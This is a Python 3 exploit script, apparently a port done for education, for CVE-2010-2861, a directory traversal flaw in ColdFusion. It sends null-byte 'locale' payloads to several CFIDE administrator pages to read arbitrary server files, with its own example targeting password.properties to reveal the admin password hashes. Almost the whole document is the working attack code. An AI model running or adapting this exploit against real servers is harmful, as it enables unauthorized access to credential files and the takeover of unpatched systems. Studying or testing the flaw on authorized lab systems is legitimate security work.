#!/usr/bin/env python3
"""
CVE-2010-2861 ColdFusion directory traversal (Python 3 port)
Original author notes preserved in the repo file.
Part of https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861
Basically ancient at this point (15 years!), it illustrates directory traversal.
Disclosing the SHA-1 password hashes in password.properties
Ported by greysneakthief for educational purposes.
"""

import sys
import socket
import re

# In case some directories are blocked
FILENAMES = (
    "/CFIDE/wizards/common/_logintowizard.cfm",
    "/CFIDE/administrator/archives/index.cfm",
    "/cfide/install.cfm",
    "/CFIDE/administrator/entman/index.cfm",
    "/CFIDE/administrator/enter.cfm",
)

POST_TEMPLATE = (
    "POST {path} HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Connection: close\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: {length}\r\n"
    "\r\n"
    "{body}"
)

def build_request(host: str, target_path: str, file_to_read: str) -> bytes:
    # Body uses the historical payload: locale=%00<path>%00a
    body = f"locale=%00{file_to_read}%00a"
    req = POST_TEMPLATE.format(
        path=target_path,
        host=host,
        length=len(body.encode("utf-8")),  # length in bytes per HTTP spec
        body=body,
    )
    return req.encode("utf-8", errors="replace")

def main():
    # Ensure proper arguments.
    if len(sys.argv) != 4:
        prog = sys.argv[0]
        print(f"usage: {prog} <host> <port> <file_path>")
        print(f"example: {prog} localhost 80 ../../../../../../../lib/password.properties")
        print("if successful, the file (or at least the page <title>) will be printed")
        return

    host = sys.argv[1]
    port = int(sys.argv[2])
    file_path = sys.argv[3]

    for fpath in FILENAMES:
        print("------------------------------")
        print("trying", fpath)

        with socket.create_connection((host, port), timeout=10) as s:
            request = build_request(host, fpath, file_path)
            s.sendall(request)

            chunks = []
            while True:
                data = s.recv(4096)
                if not data:
                    break
                chunks.append(data)

        raw = b"".join(chunks)
        # Try UTF-8 first, fall back to latin-1 to avoid decode failures
        # This seems a bit silly, but sure, just in case ISO 8859-1 or whatever.
        # Seems unlikely but I'm unfamiliar with what ColdFusion devs use.
        try:
            buf = raw.decode("utf-8", errors="replace")
        except Exception:
            buf = raw.decode("latin-1", errors="replace")

        m = re.search(r"<title>(.*?)</title>", buf, re.S | re.I)
        if m:
            title = m.group(1).strip()
            print(f"title from server in {fpath}:")
            print("------------------------------")
            print(title)
            print("------------------------------")
        else:
            # If no <title>, dump headers for hints (status, etc.)
            head = buf.split("\r\n\r\n", 1)[0]
            print("no <title> found; response headers were:")
            print(head)

if __name__ == "__main__":
    main()
